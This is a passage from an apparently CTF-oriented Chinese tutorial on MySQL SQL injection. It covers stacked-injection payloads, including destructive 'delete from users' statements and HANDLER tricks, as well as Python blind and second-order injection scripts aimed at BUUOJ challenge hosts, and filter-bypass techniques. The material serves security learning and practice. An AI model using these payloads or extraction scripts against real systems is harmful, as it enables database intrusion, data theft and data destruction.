    /?id=1';delete from users where id=20;--+    # 删除数据
    /?id=1';create table fake_users like users;--+    # 创建一个新表
    ?id=1';rename table old_table to new_table;--+    # 更改表名
    ?id=1';alter table users change old_column new_column varchar(100);--+    # 更改字段名
下面是MySQL堆叠注入的几种常见姿势。
###### rename 修改表名
    1';rename table words to words1;rename table flag_here to words;#
    # rename命令用于修改表名。
    # rename命令格式：rename table 原表名 to 新表名;
###### rename/alter 修改表名与字段名
    1';rename table words to words1;rename table flag_here to words;alter table words change flag id varchar(100);#
    rename命令用于修改表名。
    rename命令格式：rename table 原表名 to 新表名;
###### 利用 HANDLER 语句
如果rename、alter被过滤了，我们可以借助HANDLER语句来bypass。在不更改表名的情况下读取另一个表中的数据。
`HANDLER ... OPEN` 语句打开一个表，使其可以使用后续 `HANDLER ... READ`
语句访问，该表对象未被其他会话共享，并且在会话调用 `HANDLER ... CLOSE`
或会话终止之前不会关闭，详情请见：
    1';HANDLER FlagHere OPEN;HANDLER FlagHere READ FIRST;HANDLER FlagHere CLOSE;#
    或
    1';HANDLER FlagHere OPEN;HANDLER FlagHere READ FIRST;#
###### 堆叠注入中的盲注
堆叠注入中的盲注往往是插入sql语句进行实践盲注，就比如 [SWPU2019]Web4 这道题。编写时间盲注脚本：
    #author: c1e4r
    import requests
    import json
    import time
    def main():
        #题目地址
        url = '''http://568215bc-57ff-4663-a8d9-808ecfb00f7f.node3.buuoj.cn/index.php?r=Login/Login'''
        #注入payload
        payloads = "asd';set @a=0x{0};prepare ctftest from @a;execute ctftest-- -"
        flag = ''
        for i in range(1,30):
            #查询payload
            payload = "select if(ascii(substr((select flag from flag),{0},1))={1},sleep(3),1)"
            for j in range(0,128):
                #将构造好的payload进行16进制转码和json转码
                datas = {'username':payloads.format(str_to_hex(payload.format(i,j))),'password':'test213'}
                data = json.dumps(datas)
                times = time.time()
                res = requests.post(url = url, data = data)
                if time.time() - times >= 3:
                    flag = flag + chr(j)
                    print(flag)
                    break
    def str_to_hex(s):
        return ''.join([hex(ord(c)).replace('0x', '') for c in s])
    if __name__ == '__main__':
        main()
这里还涉及到了一些json的内容，json.dumps()
是把python对象转换成json对象的一个过程，生成的是字符串。web服务中传输信息的一种方式。
#### 二次注入
##### 二次注入用到的SQL语法知识
通常二次注入的成因会是插入语句，我们控制自己想要查询的语句插入到数据库中再去找一个 **能显示插入数据的回显的地方**
（可能是登陆后的用户名等等、也有可能是删除后显示删除内容的地方~），恶意插入查询语句的示例如下：
    insert into users(id,username,password,email) values(1,'0'+hex(database())+'0','0'+hex(hex(user()))+'0','PI:EMAIL')
    insert into users(id,username,password,email) values(1,'0'+substr((select hex(hex(select * from flag))),1,10)+'0','123456','PI:EMAIL')
需要对后端的SQL语句有一个猜测
这里还有一个点，我们不能直接将要查询的函数插入，因为如果直接插入的话，`'database()'`会被识别为字符串，我们需要想办法闭合前后单引号的同时将我们的查询插入，就出现了`'0'+database()+'0'`这样的构造，但是这个的回显是`0`，但是在我们进行了hex编码之后就能正常的查询了，也就是上面出现的`'0'+hex(database())+'0'`
##### 注入流程
首先找到插入点，通常情况下是一个注册页面，`register.php`这种，先简单的查看一下注册后有没有什么注册时写入的信息在之后又回显的，若有回显猜测为二次查询。
    insert into users(id,username,password,email) values(1,'0'+hex(database())+'0','0'+hex(hex(user()))+'0','PI:EMAIL')
    insert into users(id,username,password,email) values(1,'0'+substr((select hex(hex(select * from flag))),1,10)+'0','123456','PI:EMAIL')
构造类似于values中的参数进行注册等操作，然后进行查看，将hex编码解码即可，可能会有其他的先限制，比如超过10位就会转化为科学计数法，我们就需要使用`from
for`语句来进行一个限制，可以编写脚本。
    import requests
    import string
    import re as r
    import time
    ch = string.ascii_lowercase+string.digits+'-}'+'{'
    re = requests.session()
    url = 'http://9a88c359-4f55-44e9-9332-4c635c486ef0.node3.buuoj.cn/'
    def register(email,username):
        url1 = url+'register.php'
        data = dict(email = email, username = username,password = '123')
        html = re.post(url1,data=data)
        html.encoding = 'utf-8'
        return html
    def login(email):
        url2 = url+'login.php'
        data = dict(email = email,password = '123')
        html = re.post(url2, data=data)
        html.encoding = 'utf-8'
        return html
    hex_flag = ''
    for j in range(0,17):
        payload = "0'+(select substr(hex(hex((select * from flag))) from {} for {}))+'0".format(int(j)*10+1,10)
        email = '{}@qq.com'.format(str(j)+'14')
        html = register(email,payload)
        # print html.text
        html = login(email)
        try:
            res = r.findall(r'(.*?)',html.text,r.S)
            hex_flag += str(res[0]).strip()
            print hex_flag
        except:
            pass
        time.sleep(1)
    print hex_flag.decode('hex').decode('hex')
### "常见"绕过
#### 结尾注释符绕过
Mysql中常见的注释符
    、#    %23    --+或-- -    ;%00
如果所有的注释符全部被过滤了，把我们还可以尝试直接使用引号进行闭合，这种方法很好用。
#### 字符串变换绕过
    # 大小写绕过
    -1' UnIoN SeLeCt 1,2,database()--+
    # 双写绕过
    -1' uniunionon selselectect 1,2,database()--+
    # 字符串拼接绕过
    1';set @a=concat("sel","ect * from users");prepare sql from @a;execute sql;
#### 过滤 and、or 绕过
##### 管道符
    and => &&
    or => ||
##### 使用^进行异或盲注绕过
> 异或运算规则:  
>  `1^1=0 0^0=0 0^1=1`  
>  `1^1^1=0 1^1^0=0`  
>  构造payload:`'^ascii(mid(database(),1,1)=98)^0`
注意这里会多加一个^0或1是因为在盲注的时候可能出现了语法错误也无法判断,而改变这里的0或1,如果返回的结果是不同的,那就可以证明语法是没有问题的.
#### 过滤空格绕过
以下字符可以代替空格：
    # 使用注释符/**/代替空格:
    select/**/database();
    # 使用加号+代替空格:(只适用于GET方法中)
    select+database();
    # 注意: 加号+在URL中使⽤记得编码为%2B: select%2Bdatabase(); (python中不用)
    # 使⽤括号嵌套:
    select(group_concat(table_name))from(information_schema.taboles)where(tabel_schema=database());
    # 使⽤其他不可⻅字符代替空格:
    %09, %0a, %0b, %0c, %0d, %a0
    #利用``分隔进行绕过
    select host,user from user where user='a'union(select`table_name`,`table_type`from`information_schema`.`tables`);
同时任然可以利用异或符号进行盲注，我i们可以看到上面的payload中完全可以不存在空格。
#### 过滤括号绕过
##### 利用 order by 进行布尔盲注
上面有
#### 过滤比较符号（=、）绕过
比较符号一般也只出现在盲注中，所以都尽可能搭配了脚本。
##### 使用 in() 绕过
    /?id=' or ascii(substr((select database()),1,1)) in(114)--+    // 错误
    /?id=' or ascii(substr((select database()),1,1)) in(115)--+    // 正常回显
    /?id=' or substr((select database()),1,1) in('s')--+    // 正常回显
综上所述，很明显和普通的布尔盲注差不多，于是写个GET的二分法盲注脚本：
    import requests
    url = "http://b8e2048e-3513-42ad-868d-44dbb1fba5ac.node3.buuoj.cn/Less-8/?id="
    payload = "' or ascii(substr((select database()),{0},1)) in({1})--+"
    flag = ''
    if __name__ == "__main__":
        for i in range(1, 100):
            for j in range(37,128):
                url = "http://b8e2048e-3513-42ad-868d-44dbb1fba5ac.node3.buuoj.cn/Less-8/?id=' or ascii(substr((select database()),{0},1)) in({1})--+".format(i,j)
                r = requests.get(url=url)
                if "You are in" in r.text:
                    flag += chr(j)
                    print(flag)
##### LIKE 注入
在LIKE子句中，百分比(%)通配符允许 **匹配任何字符串的零个或多个字符** 。下划线 `_` 通配符允许 **匹配任何单个字符** 。
**匹配成功则返回1，反之返回0** ，可用于sql盲注。
  1. 判断数据库长度
可用length()函数，也可用`_`，如：
    /?id=' or database() like '________'--+  // 回显正常
  1. 判断数据库名
    /?id=' or database() like 's%' --+
    /?id=' or (select database()) like 's%' --+
    或者: